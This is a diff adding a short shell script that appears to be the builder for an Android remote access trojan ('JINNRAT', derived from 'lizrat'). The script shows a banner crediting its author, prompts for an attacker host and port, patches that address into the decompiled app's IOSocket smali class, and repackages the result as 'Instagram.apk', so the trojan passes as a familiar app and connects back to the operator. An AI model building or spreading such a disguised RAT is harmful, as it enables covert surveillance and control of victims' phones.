@@ -1,0 +1,35 @@
+#!/usr/bin/env sh
+
+clear
+
+smaliFile="smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"
+
+if [ -d $HOME/JINNRAT ]; then
+
+    appPath="$HOME/JINNRAT/server/app/decompiled"
+fi
+
+echo '''
+ ________  ___  ___  ___  ___       ________  ________  ________  ___  __       
+ |\   __  \|\  \|\  \|\  \|\  \     |\   ___ \|\   __  \|\   __  \|\  \|\  \     
+ \ \  \|\ /\ \  \\\  \ \  \ \  \    \ \  \_|\ \ \  \|\  \ \  \|\  \ \  \/  /|_   
+  \ \   __  \ \  \\\  \ \  \ \  \    \ \  \ \\ \ \   __  \ \   ____\ \   ___  \  
+   \ \  \|\  \ \  \\\  \ \  \ \  \____\ \  \_\\ \ \  \ \  \ \  \___|\ \  \\ \  \ 
+    \ \_______\ \_______\ \__\ \_______\ \_______\ \__\ \__\ \__\    \ \__\\ \__\
+     \|_______|\|_______|\|__|\|_______|\|_______|\|__|\|__|\|__|     \|__| \|__|
+                                                                                    
+                                                                                    
+                                𝕓𝕪 alvinbaby (MRJINN)
+                    ₹____________________<😈>_____________________₹
+                                         MRJINN 
+                           [ YouTube : https://bit.ly/3pSnvho ]
+                     ₹___________________________________________₹
+                               [ exit ] => ( CTRL - C ) 
+''' | lolcat
+
+read -p "✅ 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host
+read -p "✅ 🇵🇴🇷🇹 : " port
+
+sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
+
+apkmod -R -i "$appPath" -o ~/JINNRAT/app/Instagram.apk
